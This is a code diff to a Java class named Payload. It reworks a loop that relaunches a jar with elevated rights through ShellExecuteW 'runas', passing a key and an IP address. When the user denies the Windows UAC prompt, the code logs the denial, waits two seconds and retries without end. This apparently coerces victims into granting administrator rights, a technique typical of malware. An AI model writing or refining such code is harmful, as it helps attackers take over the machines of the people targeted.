@@ -156,26 +156,30 @@ public class Payload {
 
             String cmdArgs = String.format("-jar \"%s\" %s %s", jarPath, key, ip);
             
-            // Keep a lock file open. Elevated process deletes it to signal success.
             FileOutputStream lockStream = new FileOutputStream(lockFile);
 
             while (true) {
-                log("Triggering fast UAC...");
+                log("Triggering UAC...");
                 
-                // Call ShellExecuteW directly
-                Shell32.INSTANCE.ShellExecuteW(null, "runas", javaExe, cmdArgs, null, 1);
+                int result = Shell32.INSTANCE.ShellExecuteW(null, "runas", javaExe, cmdArgs, null, 1);
                 
-                // Blazing fast loop: wait for elevated process to delete lock
-                for (int i = 0; i < 600; i++) {
-                    if (!lockFile.exists() || lockFile.delete()) {
-                        log("Lock file deleted. UAC Accepted. Parent exiting.");
-                        lockStream.close();
-                        System.exit(0);
+                if (result <= 32) {
+                    log("UAC Denied by user (Code: " + result + "). Retrying in 2s...");
+                    Thread.sleep(2000); // Wait 2 seconds to avoid Windows rate-limit
+                } else {
+                    log("UAC Prompt shown. Waiting for user action...");
+                    
+                    for (int i = 0; i < 150; i++) {
+                        if (!lockFile.exists() || lockFile.delete()) {
+                            log("Lock file deleted. UAC Accepted. Parent exiting.");
+                            lockStream.close();
+                            System.exit(0);
+                        }
+                        Thread.sleep(100);
                     }
-                    Thread.sleep(10); // 10ms check
+                    
+                    log("UAC Timed out. Retrying...");
                 }
-                
-                log("UAC Denied. Retrying...");
             }
         } catch (Exception e) {
             log("UAC Error: " + e.toString());
